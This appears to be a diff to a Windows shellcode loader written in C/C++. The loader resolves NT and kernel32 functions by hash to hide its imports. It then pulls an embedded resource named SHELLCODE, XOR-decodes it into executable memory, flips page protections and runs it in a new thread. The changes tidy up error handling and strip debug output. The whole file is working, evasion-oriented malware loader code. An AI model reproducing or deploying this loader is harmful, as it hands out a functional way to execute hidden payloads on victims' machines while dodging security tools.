@@ -12,14 +12,18 @@
 
 #define DEBUG
 #ifdef DEBUG
-#define INFO 			setbuf(stdout, 0); printf("[INFO] ")
-#define ERR 			setbuf(stdout, 0); printf("[ERROR] ")
-#define DBG_PRINT(m,x) 	m; setbuf(stdout, 0); printf x
+#define INFO 			printf("[INFO] ")
+#define ERR 			printf("[ERR] ")
+#define DBG_PRINT(m,x) 	m; printf x
 #else
 #define INFO 
 #define ERR
 #define DBG_PRINT(m,x) 	do {} while (0)
 #endif
+#define XCPT_IMPL       NTSTATUS ntstatus = { 0 }; INT line = 0
+#define return_defer    ntstatus = GetLastError(); line = __LINE__; goto defer
+#define assert(x)       ntstatus = x; if (!NT_SUCCESS( ntstatus )) { line = __LINE__; goto defer; }
+#define assign(p,x)     p = x; if (!p) { return_defer; }
 
 HMODULE GetModuleAddress(DWORD hash);
 FARPROC GetSymbolAddress(HMODULE base, DWORD hash);
@@ -29,15 +33,14 @@ PAPI ResolveApi() {
 	auto RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
 	auto instance 			= (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
 
-	DBG_PRINT(INFO, ("API* instance: %lx\n", instance));
-
 	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
 	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
-	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATEREMOTETHREAD);
+	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATETHREAD);
 	instance->win32.NtWaitForSingleObject = (NtWaitForSingleObject_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
 	instance->win32.FindResourceA = (FindResourceA_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
 	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
 	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
+    instance->win32.FreeResource = (FreeResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FREERESOURCE);
 	instance->win32.RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
 	instance->win32.RtlFreeHeap = (RtlFreeHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);
 
@@ -72,7 +75,6 @@ HMODULE GetModuleAddress(DWORD hash) {
 		}
 		next = next->Flink;
 	}
-	DBG_PRINT(ERR, ("module (0x%lx) not found\n", hash));
 	return nullptr;
 }
 
@@ -95,11 +97,9 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {
 			auto name = RVA(LPSTR, base, names[i]);
 
 			if (hash - HashString(name, strlen(name)) == 0) {
-				DBG_PRINT(INFO, ("function %s found\n", name));
 				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
 			}
 		}
-		DBG_PRINT(ERR, ("function (0x%lx) was not found\n", hash));
 		return nullptr;
 	}
 }
@@ -110,68 +110,41 @@ int main() {
 	HANDLE hThread 		= { 0 };
 	DWORD protect 		= { 0 };
 	LPVOID lpBuffer 	= { 0 };
-	NTSTATUS ntstatus 	= { 0 };
 	PRESOURCE resource 	= { 0 };
 
-	DBG_PRINT(INFO, ("resolving api\n"));
-
+    XCPT_IMPL;
 	instance = ResolveApi();
-	resource = (PRESOURCE)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(PRESOURCE));
+	resource = (PRESOURCE)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
 
-	DBG_PRINT(INFO, ("allocating resource\n"));
+	assign(resource			    , (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE)));
+	assign(resource->Id		    , MAKEINTRESOURCE(SHELLCODE));
+	assign(resource->Object	    , instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA));
+	assign(resource->Length	    , instance->win32.SizeofResource(NULL, resource->Object));
+	assign(resource->hGlobal 	, instance->win32.LoadResource(NULL, resource->Object));
 
-	resource			= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
-	if (!resource) {
-		DBG_PRINT(ERR, ("failed to allocate space for resource: %lx\n", GetLastError()));
-		return 1;
-	}
-	resource->Id		= MAKEINTRESOURCEA(SHELLCODE);
-	if (!resource->Id) {
-		DBG_PRINT(ERR, ("failed to get resource Id: %lx\n", GetLastError()));
-		return 1;
-	}
-	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA);
-	if (!resource->Object) {
-		DBG_PRINT(ERR, ("failed to get pointer to resource object: %lx\n", GetLastError()));
-		return 1;
-	}
-	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
-	if (!resource->Length) {
-		DBG_PRINT(ERR, ("failed to get size of resource: %lx\n", GetLastError()));
-		return 1;
-	}
-	resource->hGlobal 	= instance->win32.LoadResource(NULL, resource->Object);
-	if (!resource->hGlobal) {
-		DBG_PRINT(ERR, ("failed to get data from resource: %lx\n", GetLastError()));
-		return 1;
-	}
-
-	DBG_PRINT(INFO, ("resource loaded, allocating %llu bytes virtual memory\n", resource->Length));
-
-	ntstatus = instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    DBG_PRINT(INFO, ("allocating space for resources\n"));
+	assert(instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
 	if (NT_SUCCESS(ntstatus)) {
 
-		DBG_PRINT(INFO, ("copying resources to buffer\n"));
 		x_memcpy(lpBuffer, resource->hGlobal, resource->Length);
+        instance->win32.FreeResource(resource->hGlobal);
 
-		DBG_PRINT(INFO, ("decipher\n"));
 		for (auto i = 0; i < resource->Length; i++) {
 			((PBYTE)lpBuffer)[i] ^= 0x0A;
 		}
-
-		DBG_PRINT(INFO, ("changing page protections\n"));
-		ntstatus = instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect);
+		assert(instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect))
 		if (NT_SUCCESS(ntstatus)) {
 
-			DBG_PRINT(INFO, ("creating thread\n"));
-			hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
+            DBG_PRINT(INFO, ("executing thread\n"));
+			assign(hThread, instance->win32.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL))
 			instance->win32.NtWaitForSingleObject(hThread, FALSE, INFINITE);
 		} 	
 	}
+defer:
 	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, resource);
 	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, instance);
 
-	DBG_PRINT(INFO, ("exit code: 0x%lx\n", ntstatus));
+    DBG_PRINT(INFO, ("exit status 0x%lx, line %d\n", ntstatus, line));
 	return 0;
 }
 
